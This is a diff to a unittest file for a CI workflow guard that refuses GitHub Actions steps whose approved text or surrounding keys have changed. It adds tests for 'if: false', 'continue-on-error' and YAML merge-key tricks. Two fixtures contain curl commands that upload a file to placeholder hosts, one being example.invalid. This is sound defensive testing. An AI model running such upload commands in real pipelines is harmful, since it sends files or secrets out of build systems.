@@ -110,6 +110,22 @@ class ApprovedTextTests(unittest.TestCase):
     def test_changed_script_reference_refused(self):
         self.assertIsNotNone(self.check(workflow('bash tools/b.sh'), approve_text=workflow('bash tools/a.sh')))
 
+    def test_added_if_false_on_approved_step_refused(self):
+        # the run text is approved, but the step's other keys changed: the step digest covers the whole step
+        approved = workflow('echo hi')
+        changed = approved.replace('      - run:', '      - if: false\n        run:')
+        self.assertIsNotNone(self.check(changed, approve_text=approved))
+
+    def test_added_continue_on_error_refused(self):
+        approved = workflow('echo hi')
+        changed = approved.replace('      - run:', '      - continue-on-error: true\n        run:')
+        self.assertIsNotNone(self.check(changed, approve_text=approved))
+
+    def test_yaml_merge_key_refused(self):
+        approved = workflow('echo hi')
+        changed = approved.replace('      - run:', "      - <<: {run: 'curl -F f=@x h'}\n        run:")
+        self.assertIsNotNone(self.check(changed, approve_text=approved))
+
     def test_unparseable_workflow_refused(self):
         self.assertIsNotNone(self.check('name: t\n: : not yaml [\n', approve_text='name: t\n'))
 
@@ -148,8 +164,9 @@ class PolicyTests(unittest.TestCase):
     def test_self_approval_in_allowlist_refused(self):
         trusted, cand = self.trusted_and_candidate()
         entries = json.loads((cand / ALLOWLIST).read_text(encoding='utf-8'))
+        step = {'run': 'curl -F f=@x https://example.invalid/up'}
         entries.append({'workflow': CI, 'job': 'j', 'step': None, 'shell': None, 'runs_on': 'ubuntu-24.04',
-                        'sha256': guard._run_digest('curl -F f=@x https://example.invalid/up')})
+                        'sha256': guard._step_digest(step)})
         (cand / ALLOWLIST).write_text(json.dumps(entries), encoding='utf-8')
         with self.assertRaisesRegex(ValueError, 'trusted-main policy'):
             guard.policy_violations(cand, trusted)
